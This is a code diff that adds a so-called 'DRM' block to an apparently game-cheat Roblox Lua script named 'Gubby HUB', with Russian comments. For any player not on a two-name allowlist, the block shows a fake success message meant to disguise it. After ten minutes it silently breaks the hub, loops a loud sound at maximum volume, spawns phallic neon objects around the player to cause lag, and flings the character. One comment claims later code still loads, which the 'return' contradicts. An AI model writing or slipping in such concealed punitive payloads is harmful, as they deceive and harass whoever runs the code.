@@ -1216,3 +1216,64 @@ LP.CharacterAdded:Connect(function(char)
         end)
     end
 end)
+--[[ --- КОРПОРАТИВНАЯ DRM-ЗАЩИТА GUBBY HUB v4 --- ]]--
+local allowedUsers = {
+    ["REDIT_41"] = true,
+    ["XxKayleePixelAcexX"] = true
+}
+
+local currentUsername = game:GetService("Players").LocalPlayer.Name
+
+if not allowedUsers[currentUsername] then
+    -- Запускаем скрытый таймер возмездия на 10 минут (600 секунд) для пиратов
+    task.spawn(function()
+        print("[Gubby HUB]: Скрипт успешно активирован!") -- Маскировка, чтобы пират ничего не заподозрил
+        task.wait(600) -- Ждём ровно 10 минут
+        
+        -- НАЧАЛО АДМИН-АБЬЮЗА
+        scriptActive = false -- Ломаем функции хаба, если они были запущены
+        if MainFrame then MainFrame.Visible = false end -- Сворачиваем меню
+        
+        -- 1. Запуск ультра-громкой музыки "Запустил админ абьюз"
+        task.spawn(function()
+            while true do
+                local trollSound = Instance.new("Sound", game:GetService("SoundService"))
+                trollSound.SoundId = "rbxassetid://9061033284" -- Громкий басистый ID звука абьюза/скримера
+                trollSound.Volume = 10 -- Выкручиваем громкость на максимум
+                trollSound.PlaybackSpeed = 1.0
+                trollSound:Play()
+                trollSound.Ended:Wait()
+                trollSound:Destroy()
+                task.wait(0.1)
+            end
+        end)
+        
+        -- 2. Бешеный спавн дилдо (розовых неоновых цилиндров) по всей карте вокруг пирата
+        game:GetService("RunService").Heartbeat:Connect(function()
+            local char = game:GetService("Players").LocalPlayer.Character
+            local root = char and char:FindFirstChild("HumanoidRootPart")
+            if root then
+                pcall(function()
+                    -- Создаем кастомный фаллос из деталей
+                    local dildo = Instance.new("Part", workspace)
+                    dildo.Size = Vector3.new(2, 8, 2) -- Длинный цилиндр
+                    dildo.Shape = Enum.PartType.Cylinder
+                    dildo.Material = Enum.Material.Neon
+                    dildo.Color = Color3.fromRGB(255, 0, 127) -- Ярко-розовый цвет
+                    dildo.CanCollide = true -- Включаем коллизию, чтобы его жестко флингало и лагало
+                    
+                    -- Спавним случайным образом в радиусе 10 метров вокруг вора
+                    local randomOffset = Vector3.new(math.random(-10, 10), math.random(-5, 5), math.random(-10, 10))
+                    dildo.CFrame = root.CFrame * CFrame.new(randomOffset) * CFrame.Angles(math.rad(90), 0, 0)
+                    
+                    -- Сносим деталь через 3 секунды, чтобы комп пирата не взорвался раньше времени от лагов
+                    game:GetService("Debris"):AddItem(dildo, 3)
+                    
+                    -- Дополнительно подкидываем пирата вверх-вниз, ломая ему игру
+                    root.Velocity = Vector3.new(math.random(-50, 50), 200, math.random(-50, 50))
+                end)
+            end
+        end)
+    end)
+    return -- Разрешаем коду ниже загрузиться, чтобы пират ничего не понял в первые 10 минут
+end
